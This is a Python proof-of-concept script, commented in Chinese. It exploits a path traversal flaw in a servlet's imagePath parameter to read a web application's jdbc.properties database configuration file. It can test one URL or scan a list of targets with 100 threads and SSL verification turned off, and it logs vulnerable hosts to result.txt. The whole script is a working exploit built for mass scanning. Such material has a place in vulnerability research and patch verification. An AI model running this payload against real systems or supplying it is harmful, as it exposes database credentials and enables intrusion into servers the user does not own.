import requests
import argparse
import sys
from multiprocessing.dummy import Pool

# 禁用不安全的SSL警告（在生产环境中使用时要小心）
requests.packages.urllib3.disable_warnings()

# 定义用于验证目标漏洞的函数（POC）
def poc(target):
    # HTTP请求中使用的头部信息
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Accept-Encoding": "gzip"
    }

    # 测试目录遍历漏洞的payload
    payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"

    # 步骤1：发送不带payload的GET请求到目标URL
    rsp1 = requests.get(url=target, verify=False)  # verify=False 禁用SSL证书验证

    # 如果初始请求成功（状态码为200）
    if rsp1.status_code == 200:
        # 步骤2：发送带payload的GET请求，测试参数是否暴露
        rsp2 = requests.get(url=target + payload, headers=headers, verify=False)

        # 检查响应中是否包含指示敏感信息泄露的关键词
        if 'mssql' in rsp2.text or 'oracle' in rsp2.text:
            print(f'[+]{target}存在参数读取')  # 如果发现关键词，打印正面结果
            with open('result.txt', 'a') as f:
                f.write(target + '\n')  # 将目标URL写入到文件'result.txt'
        else:
            print(f'[-]{target}不存在参数读取')  # 如果未发现关键词，打印负面结果
    else:
        print(f'[-]{target}可能存在问题，请手工测试')  # 如果初始请求失败或返回意外状态码，打印警告信息

# 主函数，处理命令行参数
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入单个链接')  # 单个URL参数
    parser.add_argument('-f', '--file', dest='file', type=str, help='文件路径')  # 包含多个URL的文件
    args = parser.parse_args()

    # 如果只提供了URL参数（没有文件）
    if args.url and not args.file:
        poc(args.url)  # 调用poc函数，测试单个URL

    # 如果只提供了文件参数（没有URL）
    elif not args.url and args.file:
        url_list = []

        # 从文件中读取URL并存储在列表中
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))

        # 使用多线程并行测试多个URL
        mp = Pool(100)  # 创建一个包含100个工作线程的线程池
        mp.map(poc, url_list)  # 将poc函数映射到URL列表的所有元素上
        mp.close()  # 关闭线程池，不再接受新的任务
        mp.join()  # 等待所有工作线程完成

    else:
        print(f"用法:\n\t python3 {sys.argv[0]} -h")  # 如果提供了不正确的参数，显示使用说明

if __name__ == '__main__':
    main()  # 在直接执行脚本时调用主函数
